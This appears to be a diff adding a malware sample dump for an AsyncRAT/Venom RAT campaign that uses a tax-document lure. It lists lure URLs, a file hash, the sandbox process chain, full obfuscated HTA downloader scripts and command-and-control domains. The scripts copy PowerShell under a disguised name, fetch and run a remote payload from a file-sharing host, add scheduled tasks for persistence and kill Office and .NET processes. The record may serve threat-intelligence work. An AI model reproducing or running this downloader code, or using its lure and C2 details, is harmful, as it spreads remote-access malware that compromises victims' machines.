@@ -1,0 +1,135 @@
+AsyncRAT 2022 | 06.04.2022 | Venom RAT 5.0.4 | Botnet Venom Clients |
+
+************************************************************************************************************
+
+.url https://dropbox-files.app.link/Tax_documents
+.url http://efex.net.br/1/Tax_Documents.docx?_branch_match_id=858276280023348658&utm_medium=marketing&_branch_referrer=H4sIAAAAAAAAA8soKSkottLXTynKL0jKr9BNy8xJLdZLLCjQy8nMy9YPSayIT8lPLs1NzSspBgARW9AQLAAAAA%3D%3D
+.doc 8056c874a9bc6c2204ab4ea45a6f0ef4f2de0302e367695fdfd3599e4509df55
+
+************************************************************************************************************
+
+Exec >>
+
+"C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" /n "C:\Users\Admin\AppData\Local\Temp\Tax_Documents.docx" /o ""
+
+C:\Windows\splwow64.exe 12288
+
+"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" -Embedding
+
+wscript C:\Users\Public\update.js
+
+C:\ProgramData\ddond.com https://taxfile.mediafire.com/file/p3ay4it08j1s7hp/0main.htm/file
+
+"C:\Windows\System32\schtasks.exe" /create /sc MINUTE /mo 92 /tn calsendersw /F /tr """C:\ProgramData\milon.com""""""https://www.mediafire.com/file/dp7ty5qaghujgmw/0Back.htm/file"""
+
+"C:\Windows\System32\taskkill.exe" /f /im WinWord.exe
+
+"C:\Windows\System32\taskkill.exe" /f /im Excel.exe
+
+"C:\Windows\System32\taskkill.exe" /f /im POWERPNT.exe
+
+"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" -Embedding
+
+C:\ProgramData\ESETNONU.com -EP B -NoP -c i'e'x([System.IO.StreamReader]::new( [System.Net.WebRequest]::Create('https://www.mediafire.com/file/dyhisehpe01yoag/mainMOB.dll/file').GetResponse().GetResponseStream()).ReadToend());
+
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\haceub52\haceub52.cmdline"
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RESA657.tmp" "c:\Users\Admin\AppData\Local\Temp\haceub52\CSCE7D4F99CC7D34482A82B1BBDFE7B3C3.TMP"
+
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe"
+
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe"
+
+C:\Windows\SysWOW64\WerFault.exe -u -p 4420 -s 520
+
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe"
+
+C:\Windows\SysWOW64\WerFault.exe -u -p 1952 -s 520
+
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe"
+
+C:\Windows\SysWOW64\WerFault.exe -u -p 1464 -s 520
+
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe"
+
+C:\Windows\SysWOW64\WerFault.exe -u -p 740 -s 520
+
+"C:\Windows\Microsoft.NET\Framework\v4.0.30319\aspnet_regbrowsers.exe"
+
+"C:\ProgramData\hahahha.sdasd~txt"
+
+C:\Windows\SysWOW64\WerFault.exe -pss -s 464 -p 4420 -ip 4420
+
+C:\Windows\SysWOW64\WerFault.exe -pss -s 476 -p 1464 -ip 1464
+
+C:\Windows\SysWOW64\WerFault.exe -pss -s 424 -p 1952 -ip 1952
+
+C:\Windows\SysWOW64\WerFault.exe -pss -s 484 -p 740 -ip 740
+
+C:\Windows\SysWOW64\WerFault.exe -pss -s 456 -p 3448 -ip 3448
+
+************************************************************************************************************
+
+Files: 0main.htm
+
+<script>
+<!--
+document.write(unescape("<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="CS"
+APPLICATIONNAME="Downloader"
+WINDOWSTATE="minimize"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+
+
+<script>
+function _0x519c(){var _0x26e6b4=['Run','C:\x5cWindows\x5cSystem32\x5cWindowsPowerShell\x5cv1.0\x5cPowershell.exe','290956PpKhrP','close','\x22\x22\x22\x22\x22\x22','8562232twLZaf','Scripting.FileSystemObject','7525026FdtJSS','1nPQNgp','taskkill\x20/f\x20/im\x20POWERPNT.exe','Win32_ProcessStartup','4452HqtFsD','7822620zRTjbf','5203592mKuqnw','C:\x5cWindows\x5cSystem32\x5cmshta.exe','39OZMHXm','taskkill\x20/f\x20/im\x20Excel.exe','CopyFile','7715jOxQDZ','C:\x5cProgramData\x5cmilon.com','1026876KiSiLb','Create','C:\x5cProgramData\x5cESETNONU.com\x20-EP\x20B\x20-NoP\x20-c\x20i\x27e\x27x([System.IO.StreamReader]::new(\x20[System.Net.WebRequest]::Create(\x27https://www.mediafire.com/file/dyhisehpe01yoag/mainMOB.dll/file\x27).GetResponse().GetResponseStream()).ReadToend());','Get','https://www.mediafire.com/file/dp7ty5qaghujgmw/0Back.htm/file\x22\x22\x22','taskkill\x20/f\x20/im\x20WinWord.exe'];_0x519c=function(){return _0x26e6b4;};return _0x519c();}var _0x100366=_0x4028;(function(_0x19ac81,_0x1dee7c){var _0x362ae4=_0x4028,_0xe8d3dd=_0x19ac81();while(!![]){try{var _0x450f67=parseInt(_0x362ae4(0x1f2))/0x1*(parseInt(_0x362ae4(0x1fe))/0x2)+-parseInt(_0x362ae4(0x1f9))/0x3*(-parseInt(_0x362ae4(0x206))/0x4)+-parseInt(_0x362ae4(0x1fc))/0x5*(-parseInt(_0x362ae4(0x1f5))/0x6)+-parseInt(_0x362ae4(0x209))/0x7+-parseInt(_0x362ae4(0x1f7))/0x8+parseInt(_0x362ae4(0x1f1))/0x9+-parseInt(_0x362ae4(0x1f6))/0xa;if(_0x450f67===_0x1dee7c)break;else _0xe8d3dd['push'](_0xe8d3dd['shift']());}catch(_0x1bc19f){_0xe8d3dd['push'](_0xe8d3dd['shift']());}}}(_0x519c,0xbf732),chuchukukukaokiwDasidow=new ActiveXObject('Wscript.Shell'),kiii='C:\x5cProgramData\x5cESETNONU.com');var king=new ActiveXObject(_0x100366(0x20a)),pit=king['CopyFile'](_0x100366(0x205),kiii);cmd=_0x100366(0x200);var w32ps=GetObject('winmgmts:')[_0x100366(0x201)](_0x100366(0x1f4));function _0x4028(_0x27f79f,_0xd1d6fc){var _0x519ca5=_0x519c();return _0x4028=function(_0x402898,_0x3c1242){_0x402898=_0x402898-0x1f1;var _0x454608=_0x519ca5[_0x402898];return _0x454608;},_0x4028(_0x27f79f,_0xd1d6fc);}w32ps['SpawnInstance_'](),w32ps['ShowWindow']=0x0;var rtrnCode=GetObject('winmgmts:')['Get']('Win32_Process')[_0x100366(0x1ff)](cmd,null,w32ps,null);chuchukukukaokiwDasidow['Run']('schtasks\x20/create\x20/sc\x20MINUTE\x20/mo\x2092\x20/tn\x20calsendersw\x20/F\x20/tr\x20\x22\x22\x22%programdata%\x5cmilon.com'+_0x100366(0x208)+_0x100366(0x202),0x0),megamon=_0x100366(0x1fd);var dihearter=new ActiveXObject(_0x100366(0x20a)),pit=dihearter[_0x100366(0x1fb)](_0x100366(0x1f8),megamon);chuchukukukaokiwDasidow[_0x100366(0x204)](_0x100366(0x203),0x0),chuchukukukaokiwDasidow[_0x100366(0x204)](_0x100366(0x1fa),0x0),chuchukukukaokiwDasidow[_0x100366(0x204)](_0x100366(0x1f3),0x0),window[_0x100366(0x207)]();
+</script>
+</head>
+<body>
+</body>
+</html>"));
+//-->
+</script>
+
+************************************************************************************************************
+
+0Back.htm
+
+<script>
+<!--
+document.write(unescape("<!DOCTYPE html>
+<html>
+<head>
+<HTA:APPLICATION ID="CS"
+APPLICATIONNAME="Downloader"
+WINDOWSTATE="minimize"
+MAXIMIZEBUTTON="no"
+MINIMIZEBUTTON="no"
+CAPTION="no"
+SHOWINTASKBAR="no">
+
+
+<script>
+
+
+function _0x34c5(){var _0x3287c1=['9xSGRVa','126sSxUBG','42376ZbmbeB','schtasks\x20/create\x20/sc\x20MINUTE\x20/mo\x2046\x20/tn\x20micrsoWord\x20/F\x20/tr\x20\x22\x22\x22%programdata%\x5cmilon.com','Get','taskkill\x20/f\x20/im\x20msbuild.exe','Win32_ProcessStartup','4501562MLKbLr','taskkill\x20/f\x20/im\x20aspnet_compiler.exe','taskkill\x20/f\x20/im\x20aspnet_regbrowsers.exe','https://www.mediafire.com/file/y8br746zads6oj3/0Start.htm/file\x22\x22\x22','64aLzXKU','taskkill\x20/f\x20/im\x20cvtres.exe','539OEinSX','taskkill\x20/f\x20/im\x20RegSvcs.exe','taskkill\x20/f\x20/im\x20csc.exe','Scripting.FileSystemObject','Run','taskkill\x20/f\x20/im\x20InstallUtil.exe','Win32_Process','taskkill\x20/f\x20/im\x20aspnet_regiis.exe','taskkill\x20/f\x20/im\x20vbc.exe','143435TtcYZh','10762vvQFMv','5417775lyyYuU','close','taskkill\x20/f\x20/im\x20RegAsm.exe','Create','\x22\x22\x22\x22\x22\x22','4092370WfGuMF','27rkbejq','12uBIemy','418172KyYcAZ','258SeReSw','Wscript.Shell'];_0x34c5=function(){return _0x3287c1;};return _0x34c5();}var _0x5bf57d=_0x11ca;(function(_0x2493c5,_0x4be3fc){var _0x4a6092=_0x11ca,_0x46cb25=_0x2493c5();while(!![]){try{var _0x114ff6=parseInt(_0x4a6092(0x159))/0x1*(parseInt(_0x4a6092(0x142))/0x2)+-parseInt(_0x4a6092(0x149))/0x3*(-parseInt(_0x4a6092(0x14b))/0x4)+-parseInt(_0x4a6092(0x141))/0x5*(-parseInt(_0x4a6092(0x14c))/0x6)+-parseInt(_0x4a6092(0x15b))/0x7*(-parseInt(_0x4a6092(0x150))/0x8)+parseInt(_0x4a6092(0x14e))/0x9*(parseInt(_0x4a6092(0x148))/0xa)+-parseInt(_0x4a6092(0x143))/0xb*(-parseInt(_0x4a6092(0x14a))/0xc)+-parseInt(_0x4a6092(0x155))/0xd*(parseInt(_0x4a6092(0x14f))/0xe);if(_0x114ff6===_0x4be3fc)break;else _0x46cb25['push'](_0x46cb25['shift']());}catch(_0x5457af){_0x46cb25['push'](_0x46cb25['shift']());}}}(_0x34c5,0xadd29),chuchukukukaokiwDasidow=new ActiveXObject(_0x5bf57d(0x14d)),kiii='C:\x5cProgramData\x5cESETNONU.com');var king=new ActiveXObject(_0x5bf57d(0x15e)),pit=king['CopyFile']('C:\x5cWindows\x5cSystem32\x5cWindowsPowerShell\x5cv1.0\x5cPowershell.exe',kiii);function _0x11ca(_0x68d5c5,_0x53e519){var _0x34c565=_0x34c5();return _0x11ca=function(_0x11ca32,_0x2aaae7){_0x11ca32=_0x11ca32-0x13c;var _0x1659fc=_0x34c565[_0x11ca32];return _0x1659fc;},_0x11ca(_0x68d5c5,_0x53e519);}cmd='C:\x5cProgramData\x5cESETNONU.com\x20-EP\x20B\x20-NoP\x20-c\x20I\x27r\x27M\x20\x27https://www.mediafire.com/file/dyhisehpe01yoag/mainMOB.dll/file\x27|i\x27e\x27x';var w32ps=GetObject('winmgmts:')[_0x5bf57d(0x152)](_0x5bf57d(0x154));w32ps['SpawnInstance_'](),w32ps['ShowWindow']=0x0;var rtrnCode=GetObject('winmgmts:')['Get'](_0x5bf57d(0x13e))[_0x5bf57d(0x146)](cmd,null,w32ps,null);chuchukukukaokiwDasidow['Run'](_0x5bf57d(0x151)+_0x5bf57d(0x147)+_0x5bf57d(0x158),0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)](_0x5bf57d(0x156),0x0),chuchukukukaokiwDasidow['Run']('taskkill\x20/f\x20/im\x20RegAsm.exe',0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)](_0x5bf57d(0x13d),0x0),chuchukukukaokiwDasidow['Run'](_0x5bf57d(0x15a),0x0),chuchukukukaokiwDasidow['Run'](_0x5bf57d(0x140),0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)](_0x5bf57d(0x153),0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)](_0x5bf57d(0x15d),0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)]('taskkill\x20/f\x20/im\x20CasPol.exe',0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)]('taskkill\x20/f\x20/im\x20jsc.exe',0x0),chuchukukukaokiwDasidow['Run'](_0x5bf57d(0x145),0x0),chuchukukukaokiwDasidow['Run'](_0x5bf57d(0x15c),0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)](_0x5bf57d(0x13f),0x0),chuchukukukaokiwDasidow[_0x5bf57d(0x13c)](_0x5bf57d(0x157),0x0),window[_0x5bf57d(0x144)]();
+
+</script>
+</head>
+<body>
+</body>
+</html>"));
+//-->
+</script>
+
+
+************************************************************************************************************
+
+c2
+mubbibun.duckdns.org:999
+bakuzamokala.duckdns.org
